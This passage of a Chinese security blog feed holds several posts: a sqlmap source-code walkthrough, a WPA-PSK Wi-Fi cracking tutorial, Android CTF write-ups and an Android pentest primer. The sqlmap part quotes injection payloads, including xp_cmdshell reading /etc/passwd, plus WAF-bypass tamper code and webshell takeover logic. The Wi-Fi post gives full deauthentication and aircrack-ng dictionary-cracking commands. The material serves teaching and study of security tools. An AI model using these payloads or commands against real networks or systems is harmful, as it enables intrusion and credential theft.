dest="showVersion",action="store_true",help="Show program's version number and exit") parser.add_option("-v", dest="verbose", type="int",help="Verbosity level: 0-6 (default %d)" % defaults.verbose) .... ... 主要显示如下： 接下来便是一个init()函数，千万不要小看这个init()函数，因为它做了很多很多的工作，当然它大部分与你输入的参数有关： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859# /lib/core/option.pydef init(): _useWizardInterface() # 引导界面、新手教学 setVerbosity() # 设置输出的详细程度 _saveConfig() # 保存参数到配置文件 _setRequestFromFile() # 读取文件中的http请求 _cleanupOptions() # 清除配置选项 _cleanupEnvironment() # 清除环境变量 _dirtyPatches() # 设置http的最大行数 _purgeOutput() # 文件粉碎 _checkDependencies() # 检查第三方库是否存在，比如mysql、mssql等连接库 _createTemporaryDirectory() # 创建临时目录 _basicOptionValidation() # 检查参数是否有效 _setProxyList() # 设置代理 _setTorProxySettings() # 设置tor代理 _setDNSServer() # 设置dns服务器 _adjustLoggingFormatter() # 调整日志格式 _setMultipleTargets() # 检测多个目标 _setTamperingFunctions() # tamper模块 _setWafFunctions() # waf识别模块 _setTrafficOutputFP() _setupHTTPCollector() _resolveCrossReferences() _checkWebSocket() # 检测websocket parseTargetUrl() # 分析目标检查url，并给config赋值 parseTargetDirect() # 分析目标数据库，并给config赋值 if any((conf.url, conf.logFile, conf.bulkFile, conf.sitemapUrl, conf.requestFile, conf.googleDork, conf.liveTest)): _setHTTPTimeout() _setHTTPExtraHeaders() # 设置http头 _setHTTPCookies() _setHTTPReferer() _setHTTPHost() _setHTTPUserAgent() _setHTTPAuthentication() # 设置http验证方式 _setHTTPHandlers() _setDNSCache() _setSocketPreConnect() # 创建一个预连接的socker connect _setSafeVisit() _doSearch() # 搜索url注入 _setBulkMultipleTargets() # 通过bulkfile读取多个url列表 _setSitemapTargets() # 分析sitemap读取url列表 _checkTor() _setCrawler() # 页面爬取深度 _findPageForms() # 从页面中搜索表单 _setDBMS() # 设置数据库类型 _setTechnique() # 设置注入类型 _setThreads() # 设置线程数 _setOS() _setWriteFile() _setMetasploit() # 设置msf接管功能 _setDBMSAuthentication() loadBoundaries() # 加载boundaries.xml文件 loadPayloads() # 加载payload.xml文件 _setPrefixSuffix() update() # sqlmap自动更新 _loadQueries() # 加载queries.xml文件 在初始化之后，便根据不同的需求运行不同的代码，如下所示：123456789101112131415# sqlmap.py#性能的自测功能，输出是图形文件，可以看出整个程序每个步骤的占用时间百分比、函数调用次数，便于能够直观看出程序运行的瓶颈所在。if conf.profile: profile() # 冒烟测试，简单来说就是对一个软件镜像尽可能的功能覆盖测试。 elif conf.smokeTest: smokeTest()# 从livetests.xml里加载用于测试注入功能的网站和配置样例，进行全面的注入测试。elif conf.liveTest: liveTest()else: try: start() # 真正的开始运行 except thread.error as ex: .... 前三个部分主要是软件的测试，和我们平时渗透没有多大关系，这里便不继续深究下去。 Sqlmap核心数据库直连sqlmap可以通过-d参数来直接连接目标数据库，不过一般需要额外安装第三方模块。 123456# /lib/controller/controller.pyif conf.direct: initTargetEnv() setupTargetEnv() action() return True 读取Session对一个网站进行sql注入测试的时候，sqlmap一般会在当前用户的目录下创建一个.sqlmap目录，里面一般会保存目标网站的一些日志、注入点设置、session信息。session信息一般会以sqllite数据库文件的形式存储，里面主要是id、value两个字段，具体图如下： 它的value值一部分是以明文的形式存储，另一部是AttribDict这个对象序列化后的以base64编码后的形式存储的。 注入标记符接下来是检索注入标记符并给出提示询问是否对标记点检测注入，也就是我们常用的*，来指定注入的位置。 123456789101112131415161718192021222324252627282930313233# /lib/core/target.py if conf.data is not None: conf.method = HTTPMETHOD.POST if not conf.method or conf.method == HTTPMETHOD.GET else conf.method hintNames = [] def process(match, repl): retVal = match.group(0) # 先取出整个字符串 if not (conf.testParameter and match.group("name") not in conf.testParameter): # 如果没有指定注入参数 retVal = repl while True: _ = re.search(r"\\g&lt;([^&gt;]+)&gt;", retVal) if _: retVal = retVal.replace(_.group(0), match.group(int(_.group(1)) if _.group(1).isdigit() else _.group(1))) else: break if kb.customInjectionMark in retVal: # 如果有注入标记符 hintNames.append((retVal.split(kb.customInjectionMark)[0], match.group("name"))) return retVal # 如果data中有注入标记符(这里默认的就是*星号，可以用来指定注入位置) if kb.processUserMarks is None and kb.customInjectionMark in conf.data: message = "custom injection marker ('%s') found in option " % kb.customInjectionMark message += "'--data'. Do you want to process it? [Y/n/q] " choice = readInput(message, default='Y').upper() if choice == 'Q': raise SqlmapUserQuitException else: kb.processUserMarks = choice == 'Y' if kb.processUserMarks: kb.testOnlyCustom = True actionsqlmap 的aciton比较简介，功能也比较清楚，主要就是根据我们的参数来dump相应的数据以及接管的操作,我稍微列举了几个有代表性的功能。 123456789101112131415161718192021222324252627# /lib/controller/action.py def action(): ... # dump if conf.getDbs: conf.dumper.dbs(conf.dbmsHandler.getDbs()) if conf.getTables: conf.dumper.dbTables(conf.dbmsHandler.getTables()) if conf.commonTables: conf.dumper.dbTables(tableExists(paths.COMMON_TABLES)) ... # takeover if conf.osCmd: conf.dbmsHandler.osCmd() if conf.osShell: conf.dbmsHandler.osShell() if conf.regRead: conf.dumper.registerValue(conf.dbmsHandler.regRead()) if conf.regAdd: conf.dbmsHandler.regAdd() .... Waf指纹接下来是加载WAF/IDS/IPS测试函数(可选参数)，conf.identifyWaf对应的是--identify-waf参数，sqlmap能够测试的WAF基本上是很齐全了，都在waf目录中。 从上图中的右边代码可以清楚的看出，主要就是发送几个payload来查看服务器做出的回应。然后根据正则等方式进行waf的指纹匹配. 主要发送的payload我也看一下，由以下四部分组成： 12345678910# /lib/core/settings.pyWAF_ATTACK_VECTORS = ( "", # NIL "search=&lt;script&gt;alert(1)&lt;/script&gt;", "file=../../../../etc/passwd", "q=&lt;invalid&gt;foobar", "id=1 %s" % IDS_WAF_CHECK_PAYLOAD)IDS_WAF_CHECK_PAYLOAD = "AND 1=1 UNION ALL SELECT 1,NULL,'&lt;script&gt;alert(\"XSS\")&lt;/script&gt;',table_name FROM information_schema.tables WHERE 2&gt;1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#" crawl爬虫sqlmap的爬虫模块主要--crawl这个参数有关，可以收集潜在的可能存在漏洞的连接，后面跟的参数是爬行的深度。crawl函数在爬虫模块/lib/utils/crawler.py中。代码就不进行列举了，简单的说明下就是Sqlmap会创建一个visited队列和一个value队列，然后进行爬行，先将页面的url通过正则、sitemap之后放入value队列（去重），然后将爬过了url放入visited队列（去重），每次爬行时都会先看看是否已经visited。 接下来是--forms，解析出页面的所有表单的功能实现。调用了/lib/core/common.py中的findPageForms()函数，而对于除了-u方式直接输入目标url的其他输入方式都采用先解析urls，再分别查表的方式 payload(核心)Sqlmap最强大的就是它的注射技术，这也是它最为核心的部分。Sqlmap启动后首先设置测试的level和risk，并识别受测试元素的类型，最终拼凑出相应的漏洞利用方案。这里的payload它主要由boundaries、payloads、queries这几部分组成，且都保存在xml目录下。 boundariesboundaries.xml中保存了注入语句的前缀、后缀，主要就是用来闭合注入点处的前半部分和后半部分。举个例子来说: ?keyword=hello world这里keyword存在注入点，并且是搜索行注入，那么它在服务器端拼接成的语句就是: 1select * from articles where title like '%hello world%'; 所以sqlmap就需要闭合掉前面的引号和后面的引号，就可能会用到boundaries.xml的下列部分： 12345678&lt;boundary&gt; &lt;level&gt;1&lt;/level&gt; &lt;!-- \-\-level 的等级--&gt; &lt;clause&gt;1&lt;/clause&gt; &lt;!-- 从句的类型--&gt; &lt;where&gt;1,2&lt;/where&gt; &lt;!-- 语句注入处, 1 为原始数据后注入，2为随机数后注入--&gt; &lt;ptype&gt;2&lt;/ptype&gt; &lt;prefix&gt;%'&lt;/prefix&gt; &lt;!-- 闭合前半部分--&gt; &lt;suffix&gt; AND '%'='&lt;/suffix&gt; &lt;!-- 闭合后半部分--&gt;&lt;/boundary&gt; 最终会闭合成： 1select * from articles where title like '%hello world%' AND '%'='%'; payloadsxml/payloads 目标下保存着六种注入类型（基于布尔、基于时间、基于错误、union、内联、堆叠）的payload，一般以&lt;test&gt;为结点，&lt;test&gt;具有特定漏洞的全部信息，包括漏洞的level、risk，漏洞类型，利用的方法，检测方法等。主要格式如下： 1（keyword=&apos;%hello world）+prefix（%&apos;）+payloads（AND [RANDNUM]=[RANDNUM]）+comment（#）+suffix（AND (&apos;%&apos;=&apos;） + （ %&apos;） queriesqueries.xml主要就是具体的dump语句了： 12345678910&lt;root&gt; &lt;!-- MySQL --&gt; &lt;dbms value="MySQL"&gt; &lt;!-- .... --&gt; &lt;hostname query="@@HOSTNAME"/&gt; &lt;table_comment query="SELECT table_comment FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='%s' AND table_name='%s'"/&gt; &lt;column_comment query="SELECT column_comment FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema='%s' AND table_name='%s' AND column_name='%s'"/&gt; &lt;is_dba query="(SELECT super_priv FROM mysql.user WHERE user='%s' LIMIT 0,1)='Y'"/&gt; &lt;check_udf query="(SELECT name FROM mysql.func WHERE name='%s' LIMIT 0,1)='%s'"/&gt; &lt;!-- .... --&gt; example在测试一个参数的时候sqlmap会遍历所有符合要求的test节点，会分别发送request与response节点下的payload，然后对服务器响应的数据包进行对比，看其是否存在差异，当确认存在注入的时候，就会以vector来加载queries.xml中的查询语句进行注入。 拿个实际注入的例子来说： TamperSqlmap 的Tamper模块主要就是用来绕waf用的，一般都保存在tamper 目录中，可以依据标准格式自定义，比如把payload用like替换等号，base64编码等…..，tamper都是具有一定的格式的，如果在渗透测试中发现sqlmap自带的tamper不符合，便可以依样画葫芦写个tamper出来： 下面是sqlmap自带的tamper，主要将等号替换成like的tamper： 12345678910111213141516171819202122232425262728# quealtolike.py def dependencies(): singleTimeWarnMessage("tamper script '%s' is unlikely to work against %s" % (os.path.basename(__file__).split(".")[0], DBMS.PGSQL))def tamper(payload, **kwargs): """ Replaces all occurances of operator equal ('=') with operator 'LIKE' Tested against: * Microsoft SQL Server 2005 * MySQL 4, 5.0 and 5.5 Notes: * Useful to bypass weak and bespoke web application firewalls that filter the equal character ('=') * The LIKE operator is SQL standard. Hence, this tamper script should work against all (?) databases &gt;&gt;&gt; tamper('SELECT * FROM users WHERE id=1') 'SELECT * FROM users WHERE id LIKE 1' """ retVal = payload if payload: retVal = re.sub(r"\s*=\s*", " LIKE ", retVal) return retVal Sqlmap接管接下来是跟提权/后门/系统有关的模块，主要与takeover.py这类型的脚本有关。 下面是osCmd() 函数： 123456789101112131415161718192021def osCmd(self): if isStackingAvailable() or conf.direct: web = False elif not isStackingAvailable() and Backend.isDbms(DBMS.MYSQL): infoMsg = "going to use a web backdoor for command execution" logger.info(infoMsg) web = True else: errMsg = "unable to execute operating system commands via " errMsg += "the back-end DBMS" raise SqlmapNotVulnerableException(errMsg) self.getRemoteTempPath() # 得到远程临时路径,写入webshell self.initEnv(web=web) if not web or (web and self.webBackdoorUrl is not None): self.runCmd(conf.osCmd) # 执行命令 if not conf.osShell and not conf.osPwn and not conf.cleanup: self.cleanup(web=web) # 清除shell webshellsqlmap自带了一部分的webshell，主要保存在shell目录下，由stager（上传马）、backdoor（执行马），不过这些webshell被压缩过了： php的上传马(stager)： php的执行马(backdoor)： 各位有兴趣的可以改成自己的webshell，压缩的代码如下： 1234567891011data = zlib.decompress(hideAscii(data))def hideAscii(data): retVal = "" for i in xrange(len(data)): if ord(data[i]) &lt; 128: retVal += chr(ord(data[i]) ^ 127) else: retVal += data[i] return retVal Sqlmap其他模块文件粉碎sqlmap自带了文件粉碎功能，可以安全删除文件，且无法恢复。主要由整理硬盘垃圾数据，获取文件句柄，填充垃圾数据，随机命名，最终删除这几个步骤组成。 1234567891011121314151617181920212223242526def purge(directory): ... # 遍历文件 for rootpath, directories, filenames in os.walk(directory): dirpaths.extend([os.path.abspath(os.path.join(rootpath, _)) for _ in directories]) filepaths.extend([os.path.abspath(os.path.join(rootpath, _)) for _ in filenames]) # 修改文件读写属性 for filepath in filepaths: try: os.chmod(filepath, stat.S_IREAD | stat.S_IWRITE) except: pass # 填充垃圾数据 for filepath in filepaths: try: filesize = os.path.getsize(filepath) with open(filepath, "w+b") as f: f.write("".join(chr(random.randint(0, 255)) for _ in xrange(filesize))) except: pass # 截断文件 ... # 重命名文件 ... # 删除文件 ... Sqlmap api如果我们要做二次开发，就可以直接利用这个sqlmap的api，通过进程通信的方式来完成sqlmap的功能,具体请参考这里。 异常汇报在脚本运行中难免会碰到这样那样的错误，sqlmap因此做了很多异常捕获以及处理，如果sqlmap捕获到的异常它无法识别以及处理，便会上传到github上，因此来告知开发者对其进行bug的修复。 1234567891011121314151617181920212223def createGithubIssue(errMsg, excMsg): ...... if choice: ex = None errMsg = errMsg[errMsg.find("\n"):] req = urllib2.Request(url="https://api.github.com/search/issues?q=%s" % urllib.quote("repo:sqlmapproject/sqlmap Unhandled exception (#%s)" % key)) try: content = urllib2.urlopen(req).read() _ = json.loads(content) duplicate = _["total_count"] &gt; 0 closed = duplicate and _["items"][0]["state"] == "closed" if duplicate: warnMsg = "issue seems to be already reported" if closed: warnMsg += " and resolved. Please update to the latest " warnMsg += "development version from official GitHub repository at '%s'" % GIT_PAGE logger.warn(warnMsg) return except: pass 自动更新这部分就不便多展开了，主要就是指sqlmap支持一键升级的功能： 总结这几天大致阅读了Sqlmap的源码，才明白了Sqlmap的强大之处不仅仅在于它的注射功能，更在于它那优秀的代码编码方式、优秀的设计理念、Pythonic 的技巧、各种Python内置模块以及第三方模块的调用等等。也因此学习到了很多新的知识，比如临时文件的粉碎级别删除等等，看了它那优秀的编码后才明白自己平时渗透测试时写的脚本看上去狗爬一般。看来平时还得多抽空看看那些有些的渗透框架、工具，这样才可以尽量避免闭门造车，省去很多很多精力。]]></content>
      <categories>
        <category>tool</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>sqlmap</tag>
        <tag>code</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[无线攻击——WIFI]]></title>
    <url>%2F2017%2F07%2F02%2Fwifi-burst%2F</url>
    <content type="text"><![CDATA[概述工作需要学习一点无线知识，索性就买了个USB的无线网卡，做了个实验，简单了解下wifi无线破解的知识。 基础知识WEP(Wired Equivalent Privacy有线对等保密)最早的无线加密体制，由于算法的缺陷很容易被破解。抓包获取在数据流中明文传输的IV，再通过统计学方法用IV得到密钥。 WPA在不升级硬件的前提下，WAP使用TKIP(Temporal Key Integrity Protocol临时密钥集成协议) 来实现WLAN的访问控制、密钥管理和数据加密来增强WEP的安全性。WPA加密算法有两个版本。 WPA = 802.1x + EAP + TKIP + MIC = Pre-shared Key + TKIP + MIC WPA2 = 802.1x + EAP + AES + CCMP = Pre-shared Key + AES + CCMP PS:身份校验算法：802.1x + EAP（工业级、不怕网络劫持和字典攻击、认证服务器）、Pre-shared Key（家庭用、容易被字典攻击、无服务器）数据传输加密算法：TKIP、AES数据完整性校验算法：MIC、CCMP WPA-PSK 的四次握手过程 AP初始化 使用 SSID 和passphares作为入参，通过哈希算法产生PSK。在WPA-PSK 中PSK=PMK=pdkdf2_SHA1(passphrase, SSID, SSID length, 4096) 第一次握手 AP广播SSID，AP_MAC(AA)；STATION 端使用接收到的SSID，AP_MAC和passphares使用同样算法产生PSK。 第二次握手 STATION 发送一个随机数SNonce，STATION_MAC(SA)给AP；AP端接收到SNonce、STATION_MAC(SA)后产生一个随机数ANonce，然后用 PMK、AP_MAC(AA)、STATION_MAC(SA)、SNonce、ANonce 用以下SHA1_PRF算法产生PTK，提取这个 PTK 前16 个字节组成一个MIC KEY。PTK=SHA1_PRF(PMK, Len(PMK), “Pairwise key expansion”, MIN(AA, SA) || Max(AA, SA) || Min(ANonce, SNonce) || Max(ANonce, SNonce)) 第三次握手 AP发送上面产生的ANonce给STATIONSTATION 端用接收到ANonce 和以前产生PMK、SNonce、AP_MAC(AA)、STATION_MAC(SA)用同样的算法产生PTK。提取这个PTK 前16 个字节组成一个MIC KEY使用以下算法产生MIC值用这个MIC KEY 和一个802.1X数据帧使用以下算法得到MIC值MIC = HMAC_MD5(MIC Key，16，802.1X data) 第四次握手 STATION 发送802.1X 数据帧，MIC给AP；STATION 端用上面那个准备好的802.1X 数据帧在最后填充上MIC值和两个字节的0（十六进制）然后发送这个数据帧到AP。AP端收到这个数据帧后提取这个MIC。并把这个数据帧的MIC部分都填上0（十六进制）这时用这个802.1X数据帧，和用上面AP产生的 MIC KEY 使用同样的算法得出MIC’。如果MIC’等于STATION 发送过来的MIC。那么第四次握手成功。若不等说明则AP 和 STATION 的密钥不相同，握手失败了。 破解WPA—PSK破解原理用我们字典中的Passphrase+SSID先生成PMK，然后结合握手包中的STA_MAC、AP_MAC、ANONCE、SNONCE计算PTK，再加上原始的报文数据算出MIC并与AP发送的MIC比较，如果一致，那么该PSK就是密钥。 环境 VMware workstation 中安装的Kali Linux 2.0 (2018.1) TL-WN725N 无线网卡 PS：由于是虚拟机，注意是否usb挂载成功以及宿主机的VM usb服务是否开启。 插上USB无线网卡后，运行iwconfig以及lsusb，发现kali没有相关驱动： 安装驱动 安装内核源代码、内核头文件以及编译环境。 123apt-get install linux-source # 安装内核源代码apt-get install linux-headers-$(uname -r) # 安装内核头文件apt-get install build-essential # 安装编译环境 在虚拟机中安装网卡驱动。 由于官网找不到这个型号网卡在Linux上的驱动，通过google找到了可用的驱动，选择其中一个下载并安装即可： 驱动一 驱动二 运行airmon-ng或者iwconfig，驱动安装成功： 123root@kali:/# airmon-ng PHY Interface Driver Chipsetphy1 wlan0 mt7601u Ralink Technology, Corp. MT7601U 破解过程 把usb网卡插入虚拟机，并开启网卡到监听模式，命令如下： 1airmon-ng start wlan0 (wlan0为无线网卡名称) 抓包查看所在区域无线网的状态，选择需破解的目标网络，命令如下： 1airodump-ng wlan0mon ( wlan0mon 为无线网卡名称) 抓取目标网络的握手包，命令如下： 1airodump-ng -c 1 --bssid F0:B4:29:65:06:1B -w /root/Desktop/ wlan0mon 如果抓不到握手包，说明没有人用这个热点。 重新打开一个terminal窗口，使用DEAUTH攻击使已经连接的客户端断开并重新连接，以产生握手包。（注意：抓握手包破解必须有合法的客户端才行）命令如下： 12# 参数解释：- 0 deauth攻击 10：进行10次攻击 -a：AP的MAC地址 -c：已连接该AP的客户端MAC地址aireplay-ng -0 10 -a F0:B4:29:65:06:1B -c D8:63:75:BE:7B:F7 wlan0mon （多试几次） 当获取到握手包时会出现红框内的信息： 通过四次握手包和字典破解密码 12# -a2 WPA的方法破解握手包 -w：字典路径 -02.cap： 第四步中抓取的握手包文件名 aircrack-ng -a2 -b F0:B4:29:65:06:1B -w /root/Desktop/6000_password.txt /root/Desktop/-02.cap 总结编译Linux驱动还很烦人的，主要时间还是浪费在了驱动上，破解操作比较简单，基本安装参考文章来的。 参考文章： WPA-PSK无线网络破解原理与过程]]></content>
      <categories>
        <category>wifi</category>
      </categories>
      <tags>
        <tag>wifi</tag>
        <tag>wpa</tag>
        <tag>wep</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android CodeEngn 练习]]></title>
    <url>%2F2017%2F06%2F25%2Fandroid-codeengn%2F</url>
    <content type="text"><![CDATA[概述为了让初学者能够更好的学习基于android的渗透测试，CodeEngn开发了很多的android app供大伙学习。 SmartApp AnalysisSmartApp 01题目地址SmartApp 01 解题步骤发现程序不能直接安装到手机上。 解压APK文件后发现有三个文件的文件名是错误的且缺少META-INF文件，所以不能正常安装到手机，如下图所示： 修改错误的文件名后，进行zip压缩，并修改后缀为apk，然后进行签名： 12$ jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore 【keystore名称】 【apk文件】 【密钥别名】$ jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore releasekey.keystore C:\Users\dell\Desktop\app-test\SmartApp-L01.apk keyalias 签名成功后安装到移动设备上，打开启动app就可以看到Key：H3ll0 C0de3ngn。 SmartApp 02题目地址SmartApp 02 解题步骤发现程序不能直接安装到手机上。 解压apk文件后发现缺少META-INF文件，签名成功后安装到移动设备上，打开启动app就可以看到如下界面： 于是反编译了下源代码，发现key的值被加密了，而且作了限制，只有条件成立，才能解密： 于是修改smali代码： 重新编译下程序，然后再进行一次签名，然后安装到手机上，key就出来了： The Key is November Rain。 SmartApp 03题目地址SmartApp 03 解题步骤发现程序不能直接安装到手机上。 解压apk文件后发现缺少META-INF文件，签名成功后安装到移动设备上，打开启动app就可以看到如下界面： 用androidlyze.py分析了下代码： 123$ a, d, dx=AnalyzeAPK('Desktop/SmartAppL03.apk', decompiler="dad")$ d.CLASS_Lcom_Namdaehyeon_findekey3_MainActivity.source()$ d.CLASS_Lcom_Namdaehyeon_findekey3_MainActivity_1.source() 看了代码之后，发现模拟器界面没有显示全，少了几个按钮，而且看到了判断的条件： 首先修改判定条件，如下图： 然后进行签名。既然模拟器运行不全，应该是android的版本有问题，换到手机试下： SmartApp 04题目地址SmartApp 04 解题步骤直接反编译一下，发现这里有个条件判断，输入key后才能显示答案正确： 先看下dex的字符串： 找到了一个比较可疑的地方，这里有一个helloWorldD函数，而直接还原成java代码，并不能找到： 通过010编辑器查看确实有一个helloWorldD函数，应该是被隐藏掉了： 找到原先的helloWorldC函数，它后面应该是helloWorldD函数，记下地址：0x0cd0 找到如下图所示的地方，根据前几个函数相应的规则，修改： 用androidlyze.py分析了下代码： 12$ d,dx = AnalyzeDex("Desktop/classes.dex",decompiler="dad")$ d.CLASS_Lcom_namdaehyeon_zfinekey4_zFindKey.source() 可以看到就是每个位置和 240(0xf0) 异或了下： 解出来就是： The Key is BoanprojectZZang #总结]]></content>
      <categories>
        <category>android</category>
      </categories>
      <tags>
        <tag>android</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android 渗透测试基础入门]]></title>
    <url>%2F2017%2F06%2F22%2Fandroid-base%2F</url>
    <content type="text"><![CDATA[概述自从毕业了之后就少了很多杂七杂八的事，可以好好的学习下Android以及Android渗透测试。 基本结构AndroidAndroid 架构Android 是基于 Linux 平台的操作系统。Android的系统架构和其操作系统一样，采用了分层的架构。从架构图看，Android分为四个层，从高层到低层分别是应用程序层、应用程序框架层、系统运行库层和Linux内核层。 Android使用Dalvik虚拟机的概念，可以高效的运行多个虚拟机。Android操作系统使用这些虚拟机将各个应用程序运行为自己的进程。 安装的应用程序会因各种目的保存到如下目录： 123456/system/app/应用名.apk // 保存系统应用程序/data/app/应用名.apk // 保存已注册的用户应用程序/data/app/应用名-1.apk // 保存用户下载的应用程序/mnt/secure/asec/应用名-1.asec // 保存移动到SD卡的应用程序/data/data/应用名 // 保存应用程序的重要信息/mnt/sdcard // 保存应用程序的一般信息 其中/data/data/应用名保存的信息最为重要： 123456/data/data/应用名├─files // 保存内部使用的文件（so、data、ini文件等）├─lib // 保存应用程序请求的库文件（存在so文件）├─databases // 保存设置文件、内容文件等的查询信息的SQLite数据库文件（存在db文件）├─cache // 有读写权限，包括浏览器缓存和用户临时状态信息└─shared_prefs // 保存为XML文件，是应用程序共享的设置文件 其中 shared_prefs 目录内的preferences.xml文件包含应用程序的设置文件。因为包括升级、版本信息等内容，所以恶意访问时，此处会包含API密钥的盗用、认证密钥值等信息。 Android 重要组件以及生命周期Android 由Activity，Service（服务）,Content Provider（内容提供者），BroadCastReceiver（广播接收器）四大基本组件组成。 ActivityAndroid 应用程序中，一个Activity通常就是一个单独的屏幕，它上面可以显示一些控件也可以监听并处理用户的事件做出响应。 Activity的生命周期如下图所示： 途中涉及到的各类方法： ServiceService 不会显示给用户，其运行过程与Activity相似。听音乐或者录音都在后台运行，与其他软件的运行是同时的，这些都属于Service的功能。 Activity与Service都以名为UI线程的相同应用线程执行。 Content ProviderContent Provider 是应用程序之间共享数据的界面。Android的每个应用程序都默认在Sandbox中运行，所以与系统中的其他应用程序相互分隔，不能直接访问数据。Content Provider遵守CURD（Create、Update、Read、Delete）原则。应用程序通过Inter共享小数据。Content Provider 适合共享音乐文件、图片文件等大容量文件。 BroadCastReceiver你的应用可以使用它对外部事件进行过滤只对感兴趣的外部事件(如当电话呼入时，或者数据网络可用时)进行接收并做出响应。广播接收器没有用户界面。然而，它们可以启动一个activity或serice 来响应它们收到的信息，或者用NotificationManager 来通知用户。通知可以用很多种方式来吸引用户的注意力──闪动背灯、震动、播放声音等。一般来说是在状态栏上放一个持久的图标，用户可以打开它并获取消息。 四大组件的注册四大基本组件都需要注册才能使用，每个Activity、service、Content Provider内容提供者都需要在AndroidManifest文件中进行配置，AndroidManifest文件中未进行声明的activity、服务以及内容提供者将不为系统所见，从而也就不可用，而BroadcastReceive广播接收者的注册分静态注册（在AndroidManifest文件中进行配置）和通过代码动态创建并以调用Context.registerReceiver()的方式注册至系统。需要注意的是在AndroidManifest文件中进行配置的广播接收者会随系统的启动而一直处于活跃状态,只要接收到感兴趣的广播就会触发（即使程序未运行）。 AndroidManifest文件中进行注册格式如下：1234&lt;activity&gt; 元素的name 属性指定了实现了这个activity 的Activity 的子类。icon 和label 属性指向了包含展示给用户的此activity 的图标和标签的资源文件。&lt;service&gt; 元素用于声明服务&lt;receiver&gt; 元素用于声明广播接收器&lt;provider&gt; 元素用于声明内容提供者 APKAPK 文件其实是一个 Zip 的压缩包，解压了此文件可以看到如下目录： 12345678910APK├─META-INF // 主要存放证书，没有证书无法安装程序 │ ├─CERT.RSA // 公钥证书│ ├─CERT.SF // 包含APP的所用资源，负责对APP进行签名│ └─MANIFEST.MF // 声明了资源，与CERT.SF相似├─res // 存放资源文件的目录├─lib // 如果存在的话，存放的是 ndk 编出来的 so 库├─resources.arsc // 编译后的二进制资源文件├─classes.dex // 最终生成的 dalvik 字节码└─AndroidManifest.xml // 程序全局配置文件 classes.dexDex是Android系统中可以在Dalvik虚拟机上直接运行的文件格式。java源代码经过ADT的复杂编译后转换成Dex文件，这是一个逐步优化的过程。Dex文件的指令码就是Dalvik虚拟机专有的一套指令集，专门为嵌入式系统优化过，相比标准java的.class文件，它体积小，运行效率高。 classes.dex 文件头的格式如下： androidManifest.xmlandroidManifest.xml 是每个Android程序中必须的文件，它位于整个项目的根目录。我们每天都在使用这个文件，往里面配置程序运行所必要的组件，权限，以及一些相关信息。 AndroidManifest.xml是Android应用的入口文件，它描述了package中暴露的组件（activities, services, 等等），他们各自的实现类，各种能被处理的数据和启动位置。 除了能声明程序中的Activities, ContentProviders, Services, 和Intent Receivers,还能指定permissions和instrumentation（安全控制和测试）。 常用工具ADBadb的全称为Android Debug Bridge，就是起到调试桥的作用。通过adb我们可以在Eclipse中方面通过DDMS来调试Android程序，说白了就是debug工具。adb的工作方式比较特殊，采用监听Socket TCP 5554等端口的方式让IDE和Qemu通讯，默认情况下adb会daemon相关的网络端口，所以当我们运行Eclipse时adb进程就会自动运行。 借助adb工具，可以管理设备或手机模拟器的状态。还可以进行很多手机操作，如安装软件、系统升级、运行shell命令等等。其实简而言说，adb就是连接Android手机与PC端的桥梁，可以让用户在电脑上对手机进行全面的操作 命令介绍123456789101112131415161718192021222324252627282930313233343536# 查看设备$ adb devices# 连接设备（夜神模拟器端口 62001）$ adb connect ip:port # 安装软件$ adb install [apk文件路径]# 卸载软件$ adb uninstall [软件名]$ adb uninstall -k [软件名] // 如果加 -k 参数,为卸载软件但是保留配置和缓存文件.# 进入设备或模拟器的shell$ adb shell# 运行单条命令$ adb shell [command]# 端口转发$ adb forward [PC] [设备]$ adb forward tcp:6100 tcp:7100 // PC上所有6100端口通信数据将被重定向到手机端7100端口server上$ adb forward tcp:6100 local:logd // PC上所有6100端口通信数据将被重定向到手机端UNIX类型socket上$ adb forward tcp:62002 jdwp:17304 //在本地62002端口被重定向到手机17304进程上# 从电脑上发送文件到设备$ adb push [本地路径] [远程路径]# 从设备上下载文件到电脑$ adb pull [远程路径] [本地路径]# 查看bug报告$ adb bugreport# 查看log$ adb logcat drozerDrozer原名mercury,是一款不错的Android APP安全评估工具。现在有社区版/专业版两个版本。 安装安装其实比较简单，这里不进行描述，只是记录下安装过程中遇到的问题以及解决方案。 一、修复连接时java路径找不到问题 解决方案： 1、创建如下文件并命名为：1.txt （如果为winXP，则可以直接命名为.drozer_config）2、写入内容如下几行内容：此处为java.exe文件的安装位置，具体情况具体处理。 123[executables]java =C:\rogram Files\Java\jdk1.7.0_40\bin\java.exejavac =C:\Program Files\Java\jdk1.7.0_04\bin\javac.exe 3、把此文件放入个人目录下文件夹： 12英文：C:\Users\&lt;youruser name&gt;\中文：C:\用户\&lt;你的用户名名称&gt;\ 4、通过cmd命令重命名此文件为：.drozer_config 1rename C:\Users\d00218136\1.txt .drozer_config 运行12$ adb connect 127.0.0.1:62001 // 连接设备$ adb forward tcp:31415 tcp:31415 // 开启端口转发 开启移动设备中的agent.apk 1$ drozer console connect 用法123# 列出设备中安装的包$ run app.package.list$ run app.package.list -f 【app名称】 // 搜索包 1234# 获取安装的包的信息$ run app.package.info$ run app.package.info -a com.zjhcsoft.android.eip // 列举指定包的信息$ run app.package.info -p android.permission.INTERNET // 根据权限来列举包 123# 列举设备上所有的activity$ run app.activity.info$ run app.activity.info -f 【包名】 搜索包的activity 1234567891011121314151617181920# 列举设备上所有的provider$ run app.provider.info# 列举设备上所有的service$ run app.service.info# 列举设备上所有的broadcast$ run app.broadcast.info# 查看某包的受攻击面$ run app.package.attacksurface com.zjhcsoft.android.eip# 运行activity$ run app.activity.info -a 【包】 $ run app.activity.start --action 【activity 设置的intent filter的action属性】 --category 【activity 设置的intent filter的category 属性】--component 【package 名字】 【component 属性】$ run app.activity.start --action android.intent.action.MAIN --category android.intent.category.LAUNCHER --component com.android.browser com.android.browser.BrowserActivity# 根据指定的intent action和intent category来查看activity$ run app.activity.forintent --action 【intent action】 --category 【intent category】$ run app.activity.forintent --action android.intent.action.VIEW --category android.intent.category.DEFAULT 